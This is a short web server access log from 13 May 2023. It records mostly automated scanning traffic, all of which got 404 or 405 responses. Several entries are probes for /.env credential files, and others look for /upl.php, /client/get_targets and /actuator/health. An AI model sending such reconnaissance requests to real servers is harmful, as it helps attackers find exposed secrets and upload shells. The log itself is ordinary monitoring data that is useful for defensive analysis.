20.55.58.5 - - [13/May/2023:11:38:45 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
144.126.192.86 - - [13/May/2023:11:50:26 +0000] "GET / HTTP/1.1" 200 2094 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
144.126.192.86 - - [13/May/2023:11:50:26 +0000] "GET /client/get_targets HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
144.126.192.86 - - [13/May/2023:11:50:26 +0000] "GET /upl.php HTTP/1.1" 404 363 "-" "Mozilla/5.0"
144.126.192.86 - - [13/May/2023:11:50:27 +0000] "GET /geoip/ HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
144.126.192.86 - - [13/May/2023:11:50:27 +0000] "GET / HTTP/1.1" 200 2094 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.0.54 (like Safari/604.1)"
144.126.192.86 - - [13/May/2023:11:50:27 +0000] "GET /favicon.ico HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.241.201.42 - - [13/May/2023:12:00:45 +0000] "GET /portal/redlion HTTP/1.1" 404 363 "-" "Mozilla/5.0 zgrab/0.x"
51.79.29.48 - - [13/May/2023:12:17:49 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2023:12:17:49 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.222.28 - - [13/May/2023:12:20:55 +0000] "GET /actuator/health HTTP/1.1" 404 363 "-" "Mozilla/5.0 zgrab/0.x"
51.254.59.113 - - [13/May/2023:12:54:01 +0000] "GET / HTTP/1.1" 200 6603 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
45.8.145.120 - - [13/May/2023:12:59:56 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.8.145.120 - - [13/May/2023:12:59:56 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.55.58.5 - - [13/May/2023:13:26:21 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
